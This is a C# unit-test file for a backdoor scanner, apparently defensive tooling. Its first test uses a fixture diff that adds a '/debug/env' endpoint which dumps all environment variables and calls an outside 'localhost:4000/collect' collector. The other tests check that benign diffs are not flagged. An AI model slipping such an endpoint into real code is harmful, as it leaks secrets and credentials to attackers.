using Defense;
using Xunit;

namespace Defense.Tests;

public class BackdoorScannerTests
{
    [Fact]
    public void FlagsADiffThatAddsAnEnvDumpEndpointWithAnOutboundCall()
    {
        var diff = string.Join("\n", new[]
        {
            "diff --git a/src/VictimApi/Program.cs b/src/VictimApi/Program.cs",
            "+++ b/src/VictimApi/Program.cs",
            "+app.MapGet(\"/debug/env\", () => {",
            "+    var vars = Environment.GetEnvironmentVariables();",
            "+    using var client = new HttpClient();",
            "+    client.PostAsync(\"http://localhost:4000/collect\", null);",
            "+    return Results.Ok(vars);",
            "+});",
        });

        var result = BackdoorScanner.Scan(diff);

        Assert.True(result.Suspicious);
        Assert.NotEmpty(result.Reasons);
    }

    [Fact]
    public void DoesNotFlagAnUnrelatedDiff()
    {
        var diff = string.Join("\n", new[]
        {
            "diff --git a/src/VictimApi/UserService.cs b/src/VictimApi/UserService.cs",
            "+++ b/src/VictimApi/UserService.cs",
            "+    public int Count() => Users.Count;",
        });

        var result = BackdoorScanner.Scan(diff);

        Assert.False(result.Suspicious);
    }

    [Fact]
    public void DoesNotFlagAnOutboundCallWithNoEnvironmentAccess()
    {
        var diff = string.Join("\n", new[]
        {
            "+++ b/src/VictimApi/Program.cs",
            "+using var client = new HttpClient();",
            "+await client.GetAsync(\"https://api.example.com/ping\");",
        });

        var result = BackdoorScanner.Scan(diff);

        Assert.False(result.Suspicious);
    }

    [Fact]
    public void DoesNotFlagEnvironmentAccessWithNoOutboundCall()
    {
        var diff = string.Join("\n", new[]
        {
            "+++ b/src/VictimApi/Program.cs",
            "+var port = Environment.GetEnvironmentVariable(\"PORT\");",
        });

        var result = BackdoorScanner.Scan(diff);

        Assert.False(result.Suspicious);
    }
}
